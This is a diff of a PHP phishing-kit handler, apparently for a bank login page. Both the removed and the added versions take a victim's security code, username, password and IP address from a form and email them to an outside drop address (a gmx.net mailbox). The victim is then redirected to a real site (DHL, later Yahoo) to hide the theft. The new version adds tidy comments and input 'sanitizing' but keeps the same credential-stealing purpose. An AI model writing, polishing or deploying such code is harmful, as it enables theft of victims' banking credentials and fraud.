@@ -1,28 +1,44 @@
-<?
+<?php
+session_start();
+ob_start("ob_gzhandler");
+set_time_limit(0);
 
-$ip = getenv("REMOTE_ADDR");
-$message .= "--------------Ali Spam ReZulT-----------------------\n";
-
-$message .= "Security Code : ".$_POST['cid']."\n";
-$message .= "USERNAME : ".$_POST['email']."\n";
-$message .= "Password : ".$_POST['pass']."\n";
-$message .= "IP: ".$ip."\n";
-$message .= "---------------Created By AJ-Snoop------------------------------\n";
-
+// Configuration
+$site_email = 'info@middleeastinvestfunds.com';
+$sender_name = 'Your Sender Name';
+$reply_to_email = 'replyto@example.com';
 $recipient = "bossemail@gmx.net";
-$subject = "Gbagam!";
-$headers = "From";
-$headers .= $_POST['eMailAdd']."\n";
-$headers .= "MIME-Version: 1.0\n";
-	 mail("", "Allied Bank Spam RezulT(Thief)", $message);
-if (mail($recipient,$subject,$message,$headers))
-	   {
-		   header("Location: http://www.dhl.com");
+$subject = "New Submission";
 
-	   }
-else
-    	   {
- 		echo "ERROR! Please go back and try again.";
-  	   }
+// Sanitize input data
+function sanitize($data) {
+    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
+}
 
+// Collect and sanitize data
+$security_code = sanitize($_POST['cid']);
+$username = sanitize($_POST['email']);
+$password = sanitize($_POST['pass']);
+$ip = getenv("REMOTE_ADDR");
+
+// Prepare the email message
+$message = "New Submission Details:\n";
+$message .= "Security Code: $security_code\n";
+$message .= "Username: $username\n";
+$message .= "Password: $password\n";
+$message .= "IP Address: $ip\n";
+
+// Prepare headers
+$headers = "From: $sender_name <$site_email>\r\n";
+$headers .= "Reply-To: $reply_to_email\r\n";
+$headers .= "MIME-Version: 1.0\r\n";
+$headers .= "Content-type: text/plain; charset=UTF-8\r\n";
+
+// Send email
+if (mail($recipient, $subject, $message, $headers)) {
+    header("Location: https://www.yahoo.com");
+    exit;
+} else {
+    echo "ERROR! Please go back and try again.";
+}
 ?>
